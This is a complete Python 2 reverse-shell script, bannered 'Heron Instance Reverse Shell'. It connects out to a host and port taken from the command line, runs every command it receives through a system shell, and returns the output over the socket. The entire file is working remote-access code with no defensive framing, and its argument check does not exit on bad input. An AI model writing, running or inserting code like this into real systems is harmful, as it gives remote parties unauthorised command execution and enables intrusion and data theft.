#!/usr/bin/python

import sys
import socket
import subprocess

def main(lhost, lport):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect((lhost, lport))
  sock.send("** Heron Instance Reverse Shell **\n")
  while True:
    sock.send("> ")
    data = sock.recv(1024)
    if data == 'exit':
      break
    shell_proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout = shell_proc.stdout.read() + shell_proc.stderr.read()
    sock.send(stdout)
  sock.close()

if __name__ == '__main__':
  if len(sys.argv) != 3:
    print "Usage: %s <lhost> <lport>"

  lhost = sys.argv[1]
  lport = int(sys.argv[2])
  main(lhost, lport)
